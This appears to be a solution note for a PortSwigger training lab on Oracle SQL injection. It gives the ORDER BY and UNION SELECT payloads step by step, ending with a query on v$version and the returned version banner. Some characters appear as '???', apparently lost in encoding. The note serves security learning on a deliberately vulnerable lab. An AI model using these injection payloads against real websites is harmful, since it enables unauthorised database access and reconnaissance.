--Name: SQL injection attack, querying the database type and version on Oracle
--URL: https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-oracle
--Level:Medium Time: 10 min
---------------------------------------------------------------------------------

-- Objective: display the database version string.
-- DB Type: Oracle

SELECT * FROM products WHERE category = 'Pets'-- ???
SELECT * FROM products WHERE category = 'Pets' ORDER BY 1-- ???     OK
SELECT * FROM products WHERE category = 'Pets' ORDER BY 2-- ???     OK
SELECT * FROM products WHERE category = 'Pets' ORDER BY 3-- ???     Error


SELECT ?, ? FROM products WHERE category = 'Pets' UNION SELECT NULL, NULL FROM DUAL-- ???    OK
SELECT ?, ? FROM products WHERE category = 'Pets' UNION SELECT 's', NULL FROM DUAL--  ???    OK
SELECT ?, ? FROM products WHERE category = 'Pets' UNION SELECT NULL, 's' FROM DUAL--  ???    OK

SELECT ?, ? FROM products WHERE category = 'Pets' UNION SELECT 's', banner FROM v$version-- ???     Solved

-------------------------------
-- CORE 11.2.0.2.0 Production
-------------------------------
-- NLSRTL Version 11.2.0.2.0 - Production
-------------------------------
-- Oracle Database 11g Express Edition Release 11.2.0.2.0 - 64bit Production
-------------------------------
-- PL/SQL Release 11.2.0.2.0 - Production
-------------------------------
-- TNS for Linux: Version 11.2.0.2.0 - Production
